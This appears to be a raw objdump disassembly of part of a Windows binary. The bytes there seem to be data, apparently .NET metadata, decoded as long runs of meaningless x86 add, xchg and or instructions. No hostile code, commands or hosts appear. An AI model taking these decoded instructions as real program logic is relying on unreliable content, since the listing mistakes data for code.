  408b57:	00 91 18 d0 09 0a    	add    %dl,0xa09d018(%ecx)
  408b5d:	00 01                	add    %al,(%ecx)
  408b5f:	00 57 20             	add    %dl,0x20(%edi)
  408b62:	00 00                	add    %al,(%eax)
  408b64:	00 00                	add    %al,(%eax)
  408b66:	91                   	xchg   %eax,%ecx
  408b67:	18 d0                	sbb    %dl,%al
  408b69:	09 0a                	or     %ecx,(%edx)
  408b6b:	00 01                	add    %al,(%ecx)
  408b6d:	00 7c 20 00          	add    %bh,0x0(%eax,%eiz,1)
  408b71:	00 00                	add    %al,(%eax)
  408b73:	00 96 00 6d 07 0a    	add    %dl,0xa076d00(%esi)
  408b79:	00 01                	add    %al,(%ecx)
  408b7b:	00 bc 20 00 00 00 00 	add    %bh,0x0(%eax,%eiz,1)
  408b82:	96                   	xchg   %eax,%esi
  408b83:	00 d1                	add    %dl,%cl
  408b85:	06                   	push   %es
  408b86:	0a 00                	or     (%eax),%al
  408b88:	01 00                	add    %eax,(%eax)
  408b8a:	c8 20 00 00          	enter  $0x20,$0x0
  408b8e:	00 00                	add    %al,(%eax)
  408b90:	91                   	xchg   %eax,%ecx
  408b91:	00 36                	add    %dh,(%esi)
  408b93:	03 0a                	add    (%edx),%ecx
  408b95:	00 01                	add    %al,(%ecx)
  408b97:	00 fc                	add    %bh,%ah
  408b99:	20 00                	and    %al,(%eax)
  408b9b:	00 00                	add    %al,(%eax)
  408b9d:	00 91 00 d2 01 0a    	add    %dl,0xa01d200(%ecx)
  408ba3:	00 01                	add    %al,(%ecx)
  408ba5:	00 28                	add    %ch,(%eax)
  408ba7:	21 00                	and    %eax,(%eax)
  408ba9:	00 00                	add    %al,(%eax)
  408bab:	00 91 00 c2 03 4d    	add    %dl,0x4d03c200(%ecx)
  408bb1:	00 01                	add    %al,(%ecx)
  408bb3:	00 8c 21 00 00 00 00 	add    %cl,0x0(%ecx,%eiz,1)
  408bba:	91                   	xchg   %eax,%ecx
  408bbb:	00 b9 0c 5e 00 01    	add    %bh,0x1005e0c(%ecx)
  408bc1:	00 14 22             	add    %dl,(%edx,%eiz,1)
  408bc4:	00 00                	add    %al,(%eax)
  408bc6:	00 00                	add    %al,(%eax)
  408bc8:	91                   	xchg   %eax,%ecx
  408bc9:	00 5d 0b             	add    %bl,0xb(%ebp)
  408bcc:	af                   	scas   %es:(%edi),%eax
  408bcd:	00 02                	add    %al,(%edx)
  408bcf:	00 18                	add    %bl,(%eax)
  408bd1:	25 00 00 00 00       	and    $0x0,%eax
  408bd6:	86 18                	xchg   %bl,(%eax)
  408bd8:	ca 09 22             	lret   $0x2209
  408bdb:	00 05 00 00 00 00    	add    %al,0x0
  408be1:	00 80 00 93 20 0f    	add    %al,0xf209300(%eax)
  408be7:	0d e0 00 05 00       	or     $0x500e0,%eax
  408bec:	00 00                	add    %al,(%eax)
  408bee:	00 00                	add    %al,(%eax)
  408bf0:	80 00 93             	addb   $0x93,(%eax)
  408bf3:	20 b6 0c e5 00 06    	and    %dh,0x600e50c(%esi)
  408bf9:	00 00                	add    %al,(%eax)
  408bfb:	00 00                	add    %al,(%eax)
  408bfd:	00 80 00 93 20 34    	add    %al,0x34209300(%eax)
  408c03:	0d ea 00 07 00       	or     $0x700ea,%eax
  408c08:	00 00                	add    %al,(%eax)
  408c0a:	00 00                	add    %al,(%eax)
  408c0c:	80 00 93             	addb   $0x93,(%eax)
  408c0f:	20 ce                	and    %cl,%dh
  408c11:	04 f2                	add    $0xf2,%al
  408c13:	00 0b                	add    %cl,(%ebx)
  408c15:	00 00                	add    %al,(%eax)
  408c17:	00 00                	add    %al,(%eax)
  408c19:	00 80 00 93 20 03    	add    %al,0x3209300(%eax)
  408c1f:	0d fa 00 0d 00       	or     $0xd00fa,%eax
  408c24:	00 00                	add    %al,(%eax)
  408c26:	00 00                	add    %al,(%eax)
  408c28:	80 00 93             	addb   $0x93,(%eax)
  408c2b:	20 53 0d             	and    %dl,0xd(%ebx)
  408c2e:	09 01                	or     %eax,(%ecx)
  408c30:	14 00                	adc    $0x0,%al
  408c32:	00 00                	add    %al,(%eax)
  408c34:	00 00                	add    %al,(%eax)
  408c36:	80 00 93             	addb   $0x93,(%eax)
  408c39:	20 23                	and    %ah,(%ebx)
  408c3b:	0d 0f 01 16 00       	or     $0x16010f,%eax
  408c40:	00 00                	add    %al,(%eax)
  408c42:	00 00                	add    %al,(%eax)
  408c44:	80 00 93             	addb   $0x93,(%eax)
  408c47:	20 ef                	and    %ch,%bh
  408c49:	0c 18                	or     $0x18,%al
  408c4b:	01 1a                	add    %ebx,(%edx)
  408c4d:	00 00                	add    %al,(%eax)
  408c4f:	00 00                	add    %al,(%eax)
  408c51:	00 80 00 93 20 7a    	add    %al,0x7a209300(%eax)
  408c57:	01 1c 01             	add    %ebx,(%ecx,%eax,1)
  408c5a:	1a 00                	sbb    (%eax),%al
  408c5c:	00 00                	add    %al,(%eax)
  408c5e:	00 00                	add    %al,(%eax)
  408c60:	80 00 93             	addb   $0x93,(%eax)
  408c63:	20 ea                	and    %ch,%dl
  408c65:	04 23                	add    $0x23,%al
  408c67:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  408c6a:	00 00                	add    %al,(%eax)
  408c6c:	00 00                	add    %al,(%eax)
  408c6e:	80 00 93             	addb   $0x93,(%eax)
  408c71:	20 d4                	and    %dl,%ah
  408c73:	0c 28                	or     $0x28,%al
  408c75:	01 1d 00 00 00 00    	add    %ebx,0x0
  408c7b:	00 03                	add    %al,(%ebx)
  408c7d:	00 86 18 ca 09 16    	add    %al,0x1609ca18(%esi)
  408c83:	00 20                	add    %ah,(%eax)
  408c85:	00 00                	add    %al,(%eax)
  408c87:	00 00                	add    %al,(%eax)
  408c89:	00 03                	add    %al,(%ebx)
  408c8b:	00 c6                	add    %al,%dh
  408c8d:	01 af 03 34 01 22    	add    %ebp,0x22013403(%edi)
  408c93:	00 00                	add    %al,(%eax)
  408c95:	00 00                	add    %al,(%eax)
  408c97:	00 03                	add    %al,(%ebx)
  408c99:	00 c6                	add    %al,%dh
  408c9b:	01 aa 03 3b 01 25    	add    %ebp,0x25013b03(%edx)
  408ca1:	00 00                	add    %al,(%eax)
  408ca3:	00 00                	add    %al,(%eax)
  408ca5:	00 03                	add    %al,(%ebx)
  408ca7:	00 c6                	add    %al,%dh
  408ca9:	01 a0 03 46 01 2a    	add    %esp,0x2a014603(%eax)
  408caf:	00 20                	add    %ah,(%eax)
  408cb1:	25 00 00 00 00       	and    $0x0,%eax
  408cb6:	86 08                	xchg   %cl,(%eax)
  408cb8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408cb9:	0c 6c                	or     $0x6c,%al
  408cbb:	01 2b                	add    %ebp,(%ebx)
  408cbd:	00 28                	add    %ch,(%eax)
  408cbf:	25 00 00 00 00       	and    $0x0,%eax
  408cc4:	86 08                	xchg   %cl,(%eax)
  408cc6:	ad                   	lods   %ds:(%esi),%eax
  408cc7:	0c 71                	or     $0x71,%al
  408cc9:	01 2b                	add    %ebp,(%ebx)
  408ccb:	00 31                	add    %dh,(%ecx)
  408ccd:	25 00 00 00 00       	and    $0x0,%eax
  408cd2:	81 08 14 0c 77 01    	orl    $0x1770c14,(%eax)
  408cd8:	2c 00                	sub    $0x0,%al
  408cda:	39 25 00 00 00 00    	cmp    %esp,0x0
  408ce0:	81 08 1f 0c 7c 01    	orl    $0x17c0c1f,(%eax)
  408ce6:	2c 00                	sub    $0x0,%al
  408ce8:	42                   	inc    %edx
  408ce9:	25 00 00 00 00       	and    $0x0,%eax
  408cee:	86 08                	xchg   %cl,(%eax)
  408cf0:	41                   	inc    %ecx
  408cf1:	02 82 01 2d 00 4a    	add    0x4a002d01(%edx),%al
  408cf7:	25 00 00 00 00       	and    $0x0,%eax
  408cfc:	86 08                	xchg   %cl,(%eax)
  408cfe:	4f                   	dec    %edi
  408cff:	02 86 01 2d 00 53    	add    0x53002d01(%esi),%al
  408d05:	25 00 00 00 00       	and    $0x0,%eax
  408d0a:	86 08                	xchg   %cl,(%eax)
  408d0c:	30 00                	xor    %al,(%eax)
  408d0e:	49                   	dec    %ecx
  408d0f:	00 2e                	add    %ch,(%esi)
  408d11:	00 5b 25             	add    %bl,0x25(%ebx)
  408d14:	00 00                	add    %al,(%eax)
  408d16:	00 00                	add    %al,(%eax)
  408d18:	86 08                	xchg   %cl,(%eax)
  408d1a:	39 00                	cmp    %eax,(%eax)
  408d1c:	8b 01                	mov    (%ecx),%eax
  408d1e:	2e 00 64 25 00       	add    %ah,%cs:0x0(%ebp,%eiz,1)
  408d23:	00 00                	add    %al,(%eax)
  408d25:	00 86 08 12 09 49    	add    %al,0x49091208(%esi)
  408d2b:	00 2f                	add    %ch,(%edi)
  408d2d:	00 6c 25 00          	add    %ch,0x0(%ebp,%eiz,1)
  408d31:	00 00                	add    %al,(%eax)
  408d33:	00 86 08 1d 09 8b    	add    %al,-0x74f6e2f8(%esi)
  408d39:	01 2f                	add    %ebp,(%edi)
  408d3b:	00 75 25             	add    %dh,0x25(%ebp)
  408d3e:	00 00                	add    %al,(%eax)
  408d40:	00 00                	add    %al,(%eax)
  408d42:	86 08                	xchg   %cl,(%eax)
  408d44:	76 0d                	jbe    0x408d53
  408d46:	49                   	dec    %ecx
  408d47:	00 30                	add    %dh,(%eax)
  408d49:	00 7d 25             	add    %bh,0x25(%ebp)
  408d4c:	00 00                	add    %al,(%eax)
  408d4e:	00 00                	add    %al,(%eax)
  408d50:	86 08                	xchg   %cl,(%eax)
  408d52:	7e 0d                	jle    0x408d61
  408d54:	8b 01                	mov    (%ecx),%eax
  408d56:	30 00                	xor    %al,(%eax)
  408d58:	86 25 00 00 00 00    	xchg   %ah,0x0
  408d5e:	86 08                	xchg   %cl,(%eax)
  408d60:	36 0c 82             	ss or  $0x82,%al
  408d63:	01 31                	add    %esi,(%ecx)
  408d65:	00 8e 25 00 00 00    	add    %cl,0x25(%esi)
  408d6b:	00 86 08 44 0c 86    	add    %al,-0x79f3bbf8(%esi)
  408d71:	01 31                	add    %esi,(%ecx)
  408d73:	00 98 25 00 00 00    	add    %bl,0x25(%eax)
  408d79:	00 86 18 ca 09 90    	add    %al,-0x6ff635e8(%esi)
  408d7f:	01 32                	add    %esi,(%edx)
  408d81:	00 f6                	add    %dh,%dh
  408d83:	25 00 00 00 00       	and    $0x0,%eax
  408d88:	86 00                	xchg   %al,(%eax)
  408d8a:	89 0c 22             	mov    %ecx,(%edx,%eiz,1)
  408d8d:	00 34 00             	add    %dh,(%eax,%eax,1)
  408d90:	24 26                	and    $0x26,%al
  408d92:	00 00                	add    %al,(%eax)
  408d94:	00 00                	add    %al,(%eax)
  408d96:	81 00 80 0b 82 01    	addl   $0x1820b80,(%eax)
  408d9c:	34 00                	xor    $0x0,%al
  408d9e:	8c 26                	mov    %fs,(%esi)
  408da0:	00 00                	add    %al,(%eax)
  408da2:	00 00                	add    %al,(%eax)
  408da4:	86 00                	xchg   %al,(%eax)
  408da6:	7d 0b                	jge    0x408db3
  408da8:	b8 01 34 00 be       	mov    $0xbe003401,%eax
  408dad:	26 00 00             	add    %al,%es:(%eax)
  408db0:	00 00                	add    %al,(%eax)
  408db2:	86 00                	xchg   %al,(%eax)
  408db4:	93                   	xchg   %eax,%ebx
  408db5:	06                   	push   %es
  408db6:	22 00                	and    (%eax),%al
  408db8:	35 00 f4 26 00       	xor    $0x26f400,%eax
  408dbd:	00 00                	add    %al,(%eax)
  408dbf:	00 81 00 a2 00 e3    	add    %al,-0x1cff5e00(%ecx)
  408dc5:	01 35 00 94 27 00    	add    %esi,0x279400
  408dcb:	00 00                	add    %al,(%eax)
  408dcd:	00 86 00 a1 01 b8    	add    %al,-0x47fe5f00(%esi)
  408dd3:	01 35 00 d9 27 00    	add    %esi,0x27d900
  408dd9:	00 00                	add    %al,(%eax)
  408ddb:	00 81 00 97 09 f6    	add    %al,-0x9f66900(%ecx)
  408de1:	01 36                	add    %esi,(%esi)
  408de3:	00 e8                	add    %ch,%al
  408de5:	27                   	daa
  408de6:	00 00                	add    %al,(%eax)
  408de8:	00 00                	add    %al,(%eax)
  408dea:	86 00                	xchg   %al,(%eax)
  408dec:	ad                   	lods   %ds:(%esi),%eax
  408ded:	01 b8 01 37 00 09    	add    %edi,0x9003701(%eax)
  408df3:	28 00                	sub    %al,(%eax)
  408df5:	00 00                	add    %al,(%eax)
  408df7:	00 86 00 ac 0b 0a    	add    %al,0xa0bac00(%esi)
  408dfd:	02 38                	add    (%eax),%bh
  408dff:	00 27                	add    %ah,(%edi)
  408e01:	28 00                	sub    %al,(%eax)
  408e03:	00 00                	add    %al,(%eax)
  408e05:	00 86 00 a1 0b 0a    	add    %al,0xa0ba100(%esi)
  408e0b:	02 39                	add    (%ecx),%bh
  408e0d:	00 4c 28 00          	add    %cl,0x0(%eax,%ebp,1)
  408e11:	00 00                	add    %al,(%eax)
  408e13:	00 81 00 99 00 41    	add    %al,0x41009900(%ecx)
  408e19:	02 3a                	add    (%edx),%bh
  408e1b:	00 10                	add    %dl,(%eax)
  408e1d:	29 00                	sub    %eax,(%eax)
  408e1f:	00 00                	add    %al,(%eax)
  408e21:	00 81 00 5d 02 b8    	add    %al,-0x47fda300(%ecx)
  408e27:	01 3b                	add    %edi,(%ebx)
  408e29:	00 34 29             	add    %dh,(%ecx,%ebp,1)
  408e2c:	00 00                	add    %al,(%eax)
  408e2e:	00 00                	add    %al,(%eax)
  408e30:	e6 01                	out    %al,$0x1
  408e32:	b4 04                	mov    $0x4,%ah
  408e34:	22 00                	and    (%eax),%al
  408e36:	3c 00                	cmp    $0x0,%al
  408e38:	00 00                	add    %al,(%eax)
  408e3a:	00 00                	add    %al,(%eax)
  408e3c:	03 00                	add    (%eax),%eax
  408e3e:	86 18                	xchg   %bl,(%eax)
  408e40:	ca 09 16             	lret   $0x1609
  408e43:	00 3c 00             	add    %bh,(%eax,%eax,1)
  408e46:	00 00                	add    %al,(%eax)
  408e48:	00 00                	add    %al,(%eax)
  408e4a:	03 00                	add    (%eax),%eax
  408e4c:	c6 01 af             	movb   $0xaf,(%ecx)
  408e4f:	03 82 01 3e 00 00    	add    0x3e01(%edx),%eax
  408e55:	00 00                	add    %al,(%eax)
  408e57:	00 03                	add    %al,(%ebx)
  408e59:	00 c6                	add    %al,%dh
  408e5b:	01 aa 03 5e 02 3e    	add    %ebp,0x3e025e03(%edx)
  408e61:	00 00                	add    %al,(%eax)
  408e63:	00 00                	add    %al,(%eax)
  408e65:	00 03                	add    %al,(%ebx)
  408e67:	00 c6                	add    %al,%dh
  408e69:	01 a0 03 66 02 40    	add    %esp,0x40026603(%eax)
  408e6f:	00 00                	add    %al,(%eax)
  408e71:	00 00                	add    %al,(%eax)
  408e73:	00 03                	add    %al,(%ebx)
  408e75:	00 86 18 ca 09 16    	add    %al,0x1609ca18(%esi)
  408e7b:	00 41 00             	add    %al,0x0(%ecx)
  408e7e:	00 00                	add    %al,(%eax)
  408e80:	00 00                	add    %al,(%eax)
  408e82:	03 00                	add    (%eax),%eax
  408e84:	c6 01 af             	movb   $0xaf,(%ecx)
  408e87:	03 41 02             	add    0x2(%ecx),%eax
  408e8a:	43                   	inc    %ebx
  408e8b:	00 00                	add    %al,(%eax)
  408e8d:	00 00                	add    %al,(%eax)
  408e8f:	00 03                	add    %al,(%ebx)
  408e91:	00 c6                	add    %al,%dh
  408e93:	01 aa 03 6c 02 44    	add    %ebp,0x44026c03(%edx)
  408e99:	00 00                	add    %al,(%eax)
  408e9b:	00 00                	add    %al,(%eax)
  408e9d:	00 03                	add    %al,(%ebx)
  408e9f:	00 c6                	add    %al,%dh
  408ea1:	01 a0 03 77 02 47    	add    %esp,0x47027703(%eax)
  408ea7:	00 00                	add    %al,(%eax)
  408ea9:	00 00                	add    %al,(%eax)
  408eab:	00 03                	add    %al,(%ebx)
  408ead:	00 86 18 ca 09 16    	add    %al,0x1609ca18(%esi)
  408eb3:	00 48 00             	add    %cl,0x0(%eax)
  408eb6:	00 00                	add    %al,(%eax)
  408eb8:	00 00                	add    %al,(%eax)
  408eba:	03 00                	add    (%eax),%eax
  408ebc:	c6 01 af             	movb   $0xaf,(%ecx)
  408ebf:	03 e3                	add    %ebx,%esp
  408ec1:	01 4a 00             	add    %ecx,0x0(%edx)
  408ec4:	00 00                	add    %al,(%eax)
  408ec6:	00 00                	add    %al,(%eax)
  408ec8:	03 00                	add    (%eax),%eax
  408eca:	c6 01 aa             	movb   $0xaa,(%ecx)
  408ecd:	03 5e 02             	add    0x2(%esi),%ebx
  408ed0:	4a                   	dec    %edx
  408ed1:	00 00                	add    %al,(%eax)
  408ed3:	00 00                	add    %al,(%eax)
  408ed5:	00 03                	add    %al,(%ebx)
  408ed7:	00 c6                	add    %al,%dh
  408ed9:	01 a0 03 7d 02 4c    	add    %esp,0x4c027d03(%eax)
  408edf:	00 00                	add    %al,(%eax)
  408ee1:	00 00                	add    %al,(%eax)
  408ee3:	00 03                	add    %al,(%ebx)
  408ee5:	00 86 18 ca 09 16    	add    %al,0x1609ca18(%esi)
  408eeb:	00 4d 00             	add    %cl,0x0(%ebp)
  408eee:	00 00                	add    %al,(%eax)
  408ef0:	00 00                	add    %al,(%eax)
  408ef2:	03 00                	add    (%eax),%eax
  408ef4:	c6 01 af             	movb   $0xaf,(%ecx)
  408ef7:	03 f6                	add    %esi,%esi
  408ef9:	01 4f 00             	add    %ecx,0x0(%edi)
  408efc:	00 00                	add    %al,(%eax)
  408efe:	00 00                	add    %al,(%eax)
  408f00:	03 00                	add    (%eax),%eax
  408f02:	c6 01 aa             	movb   $0xaa,(%ecx)
  408f05:	03 84 02 50 00 00 00 	add    0x50(%edx,%eax,1),%eax
  408f0c:	00 00                	add    %al,(%eax)
  408f0e:	03 00                	add    (%eax),%eax
  408f10:	c6 01 a0             	movb   $0xa0,(%ecx)
  408f13:	03 8e 02 53 00 54    	add    0x54005302(%esi),%ecx
  408f19:	29 00                	sub    %eax,(%eax)
  408f1b:	00 00                	add    %al,(%eax)
  408f1d:	00 96 00 31 08 a0    	add    %dl,-0x5ff7cf00(%esi)
  408f23:	02 54 00 ba          	add    -0x46(%eax,%eax,1),%dl
  408f27:	29 00                	sub    %eax,(%eax)
  408f29:	00 00                	add    %al,(%eax)
  408f2b:	00 91 00 0a 07 bc    	add    %dl,-0x43f8f600(%ecx)
  408f31:	02 55 00             	add    0x0(%ebp),%dl
  408f34:	cc                   	int3
  408f35:	29 00                	sub    %eax,(%eax)
  408f37:	00 00                	add    %al,(%eax)
  408f39:	00 91 00 96 0d f3    	add    %dl,-0xcf26a00(%ecx)
  408f3f:	02 56 00             	add    0x0(%esi),%dl
  408f42:	34 2a                	xor    $0x2a,%al
  408f44:	00 00                	add    %al,(%eax)
  408f46:	00 00                	add    %al,(%eax)
  408f48:	91                   	xchg   %eax,%ecx
  408f49:	00 f6                	add    %dh,%dh
  408f4b:	08 12                	or     %dl,(%edx)
  408f4d:	03 57 00             	add    0x0(%edi),%edx
  408f50:	68 2a 00 00 00       	push   $0x2a
  408f55:	00 91 00 c5 07 4f    	add    %dl,0x4f07c500(%ecx)
  408f5b:	03 59 00             	add    0x0(%ecx),%ebx
  408f5e:	ec                   	in     (%dx),%al
  408f5f:	2a 00                	sub    (%eax),%al
  408f61:	00 00                	add    %al,(%eax)
  408f63:	00 91 00 c5 07 6b    	add    %dl,0x6b07c500(%ecx)
  408f69:	03 5a 00             	add    0x0(%edx),%ebx
  408f6c:	0c 2b                	or     $0x2b,%al
  408f6e:	00 00                	add    %al,(%eax)
  408f70:	00 00                	add    %al,(%eax)
  408f72:	91                   	xchg   %eax,%ecx
  408f73:	00 ba 07 7d 03 5c    	add    %bh,0x5c037d07(%edx)
  408f79:	00 34 2b             	add    %dh,(%ebx,%ebp,1)
  408f7c:	00 00                	add    %al,(%eax)
  408f7e:	00 00                	add    %al,(%eax)
  408f80:	91                   	xchg   %eax,%ecx
  408f81:	00 38                	add    %bh,(%eax)
  408f83:	0a a8 03 5d 00 f4    	or     -0xbffa2fd(%eax),%ch
  408f89:	2b 00                	sub    (%eax),%eax
  408f8b:	00 00                	add    %al,(%eax)
  408f8d:	00 96 00 86 0d f3    	add    %dl,-0xcf27a00(%esi)
  408f93:	03 60 00             	add    0x0(%eax),%esp
  408f96:	d4 2c                	aam    $0x2c
  408f98:	00 00                	add    %al,(%eax)
  408f9a:	00 00                	add    %al,(%eax)
  408f9c:	91                   	xchg   %eax,%ecx
  408f9d:	18 d0                	sbb    %dl,%al
  408f9f:	09 0a                	or     %ecx,(%edx)
  408fa1:	00 62 00             	add    %ah,0x0(%edx)
  408fa4:	31 2d 00 00 00 00    	xor    %ebp,0x0
  408faa:	96                   	xchg   %eax,%esi
  408fab:	00 1a                	add    %bl,(%edx)
  408fad:	07                   	pop    %es
  408fae:	0a 00                	or     (%eax),%al
  408fb0:	62 00                	bound  %eax,(%eax)
  408fb2:	00 00                	add    %al,(%eax)
  408fb4:	01 00                	add    %eax,(%eax)
  408fb6:	4a                   	dec    %edx
  408fb7:	03 00                	add    (%eax),%eax
  408fb9:	00 01                	add    %al,(%ecx)
  408fbb:	00 5e 03             	add    %bl,0x3(%esi)
  408fbe:	00 00                	add    %al,(%eax)
  408fc0:	02 00                	add    (%eax),%al
  408fc2:	2b 09                	sub    (%ecx),%ecx
  408fc4:	00 00                	add    %al,(%eax)
  408fc6:	03 00                	add    (%eax),%eax
  408fc8:	28 09                	sub    %cl,(%ecx)
  408fca:	00 00                	add    %al,(%eax)
  408fcc:	01 00                	add    %eax,(%eax)
  408fce:	77 07                	ja     0x408fd7
  408fd0:	00 00                	add    %al,(%eax)
  408fd2:	01 00                	add    %eax,(%eax)
  408fd4:	c9                   	leave
  408fd5:	01 00                	add    %eax,(%eax)
  408fd7:	00 01                	add    %al,(%ecx)
  408fd9:	00 61 07             	add    %ah,0x7(%ecx)
  408fdc:	00 00                	add    %al,(%eax)
  408fde:	02 00                	add    (%eax),%al
  408fe0:	5e                   	pop    %esi
  408fe1:	03 00                	add    (%eax),%eax
  408fe3:	00 03                	add    %al,(%ebx)
  408fe5:	00 13                	add    %dl,(%ebx)
  408fe7:	08 00                	or     %al,(%eax)
  408fe9:	00 04 00             	add    %al,(%eax,%eax,1)
  408fec:	0c 08                	or     $0x8,%al
  408fee:	00 20                	add    %ah,(%eax)
  408ff0:	00 00                	add    %al,(%eax)
  408ff2:	00 00                	add    %al,(%eax)
  408ff4:	00 00                	add    %al,(%eax)
  408ff6:	01 00                	add    %eax,(%eax)
  408ff8:	df 04 00             	filds  (%eax,%eax,1)
  408ffb:	00 01                	add    %al,(%ecx)
  408ffd:	00 6d 0d             	add    %ch,0xd(%ebp)
  409000:	00 00                	add    %al,(%eax)
  409002:	02 00                	add    (%eax),%al
  409004:	51                   	push   %ecx
  409005:	03 00                	add    (%eax),%eax
  409007:	00 03                	add    %al,(%ebx)
  409009:	00 df                	add    %bl,%bh
  40900b:	04 02                	add    $0x2,%al
  40900d:	20 04 00             	and    %al,(%eax,%eax,1)
  409010:	b7 06                	mov    $0x6,%bh
  409012:	00 00                	add    %al,(%eax)
  409014:	05 00 af 06 00       	add    $0x6af00,%eax
  409019:	00 06                	add    %al,(%esi)
  40901b:	00 c8                	add    %cl,%al
  40901d:	0a 00                	or     (%eax),%al
  40901f:	00 07                	add    %al,(%edi)
  409021:	00 96 07 00 00 01    	add    %dl,0x1000007(%esi)
  409027:	00 64 03 00          	add    %ah,0x0(%ebx,%eax,1)
  40902b:	00 02                	add    %al,(%edx)
  40902d:	00 78 04             	add    %bh,0x4(%eax)
  409030:	00 00                	add    %al,(%eax)
  409032:	01 00                	add    %eax,(%eax)
  409034:	6f                   	outsl  %ds:(%esi),(%dx)
  409035:	02 00                	add    (%eax),%al
  409037:	00 02                	add    %al,(%edx)
  409039:	00 4a 07             	add    %cl,0x7(%edx)
  40903c:	00 00                	add    %al,(%eax)
  40903e:	03 00                	add    (%eax),%eax
  409040:	2a 03                	sub    (%ebx),%al
  409042:	00 00                	add    %al,(%eax)
  409044:	04 00                	add    $0x0,%al
  409046:	6f                   	outsl  %ds:(%esi),(%dx)
  409047:	01 00                	add    %eax,(%eax)
  409049:	00 01                	add    %al,(%ecx)
  40904b:	00 19                	add    %bl,(%ecx)
  40904d:	03 02                	add    (%edx),%eax
  40904f:	00 02                	add    %al,(%edx)
  409051:	00 93 01 00 00 01    	add    %dl,0x1000001(%ebx)
  409057:	00 6a 03             	add    %ch,0x3(%edx)
  40905a:	00 00                	add    %al,(%eax)
  40905c:	01 00                	add    %eax,(%eax)
  40905e:	19 03                	sbb    %eax,(%ebx)
  409060:	00 00                	add    %al,(%eax)
  409062:	02 00                	add    (%eax),%al
  409064:	e2 0c                	loop   0x409072
  409066:	00 00                	add    %al,(%eax)
  409068:	03 00                	add    (%eax),%eax
  40906a:	77 0c                	ja     0x409078
  40906c:	00 00                	add    %al,(%eax)
  40906e:	01 00                	add    %eax,(%eax)
  409070:	76 0b                	jbe    0x40907d
  409072:	00 00                	add    %al,(%eax)
  409074:	02 00                	add    (%eax),%al
  409076:	2f                   	das
  409077:	03 00                	add    (%eax),%eax
  409079:	00 01                	add    %al,(%ecx)
  40907b:	00 5e 03             	add    %bl,0x3(%esi)
  40907e:	00 00                	add    %al,(%eax)
  409080:	02 00                	add    (%eax),%al
  409082:	13 08                	adc    (%eax),%ecx
  409084:	00 00                	add    %al,(%eax)
  409086:	03 00                	add    (%eax),%eax
  409088:	0c 08                	or     $0x8,%al
  40908a:	00 00                	add    %al,(%eax)
  40908c:	01 00                	add    %eax,(%eax)
  40908e:	5e                   	pop    %esi
  40908f:	03 00                	add    (%eax),%eax
  409091:	00 02                	add    %al,(%edx)
  409093:	00 13                	add    %dl,(%ebx)
  409095:	08 00                	or     %al,(%eax)
  409097:	00 03                	add    %al,(%ebx)
  409099:	00 0c 08             	add    %cl,(%eax,%ecx,1)
  40909c:	00 00                	add    %al,(%eax)
  40909e:	04 00                	add    $0x0,%al
  4090a0:	4a                   	dec    %edx
  4090a1:	07                   	pop    %es
  4090a2:	00 00                	add    %al,(%eax)
  4090a4:	05 00 76 0b 00       	add    $0xb7600,%eax
  4090a9:	00 01                	add    %al,(%ecx)
  4090ab:	00 5f 0c             	add    %bl,0xc(%edi)
  4090ae:	00 00                	add    %al,(%eax)
  4090b0:	01 00                	add    %eax,(%eax)
  4090b2:	8d 06                	lea    (%esi),%eax
  4090b4:	00 00                	add    %al,(%eax)
  4090b6:	01 00                	add    %eax,(%eax)
  4090b8:	8d 06                	lea    (%esi),%eax
  4090ba:	00 00                	add    %al,(%eax)
  4090bc:	01 00                	add    %eax,(%eax)
  4090be:	8d 06                	lea    (%esi),%eax
  4090c0:	00 00                	add    %al,(%eax)
  4090c2:	01 00                	add    %eax,(%eax)
  4090c4:	8d 06                	lea    (%esi),%eax
  4090c6:	00 00                	add    %al,(%eax)
  4090c8:	01 00                	add    %eax,(%eax)
  4090ca:	8d 06                	lea    (%esi),%eax
  4090cc:	00 00                	add    %al,(%eax)
  4090ce:	01 00                	add    %eax,(%eax)
  4090d0:	8d 06                	lea    (%esi),%eax
  4090d2:	00 00                	add    %al,(%eax)
  4090d4:	01 00                	add    %eax,(%eax)
  4090d6:	8d 06                	lea    (%esi),%eax
  4090d8:	00 00                	add    %al,(%eax)
  4090da:	01 00                	add    %eax,(%eax)
  4090dc:	b1 0c                	mov    $0xc,%cl
  4090de:	00 00                	add    %al,(%eax)
  4090e0:	02 00                	add    (%eax),%al
  4090e2:	82 0d 00 00 01 00 2e 	orb    $0x2e,0x10000
  4090e9:	09 00                	or     %eax,(%eax)
  4090eb:	00 01                	add    %al,(%ecx)
  4090ed:	00 2e                	add    %ch,(%esi)
  4090ef:	09 00                	or     %eax,(%eax)
  4090f1:	00 01                	add    %al,(%ecx)
  4090f3:	00 e7                	add    %ah,%bh
  4090f5:	0b 00                	or     (%eax),%eax
  4090f7:	00 01                	add    %al,(%ecx)
  4090f9:	00 2e                	add    %ch,(%esi)
  4090fb:	09 00                	or     %eax,(%eax)
  4090fd:	00 01                	add    %al,(%ecx)
  4090ff:	00 06                	add    %al,(%esi)
  409101:	0c 00                	or     $0x0,%al
  409103:	00 01                	add    %al,(%ecx)
  409105:	00 06                	add    %al,(%esi)
  409107:	0c 00                	or     $0x0,%al
  409109:	00 01                	add    %al,(%ecx)
  40910b:	00 ae 00 00 00 01    	add    %ch,0x1000000(%esi)
  409111:	00 2e                	add    %ch,(%esi)
  409113:	09 00                	or     %eax,(%eax)
  409115:	00 01                	add    %al,(%ecx)
  409117:	00 76 0b             	add    %dh,0xb(%esi)
  40911a:	00 00                	add    %al,(%eax)
  40911c:	02 00                	add    (%eax),%al
  40911e:	2f                   	das
  40911f:	03 00                	add    (%eax),%eax
  409121:	00 01                	add    %al,(%ecx)
  409123:	00 4a 07             	add    %cl,0x7(%edx)
  409126:	00 00                	add    %al,(%eax)
  409128:	02 00                	add    (%eax),%al
  40912a:	76 0b                	jbe    0x409137
  40912c:	00 00                	add    %al,(%eax)
  40912e:	01 00                	add    %eax,(%eax)
  409130:	5f                   	pop    %edi
  409131:	0c 00                	or     $0x0,%al
  409133:	00 01                	add    %al,(%ecx)
  409135:	00 76 0b             	add    %dh,0xb(%esi)
  409138:	00 00                	add    %al,(%eax)
  40913a:	02 00                	add    (%eax),%al
  40913c:	2f                   	das
  40913d:	03 00                	add    (%eax),%eax
  40913f:	00 01                	add    %al,(%ecx)
  409141:	00 ae 00 00 00 01    	add    %ch,0x1000000(%esi)
  409147:	00 ae 00 00 00 02    	add    %ch,0x2000000(%esi)
  40914d:	00 4a 07             	add    %cl,0x7(%edx)
  409150:	00 00                	add    %al,(%eax)
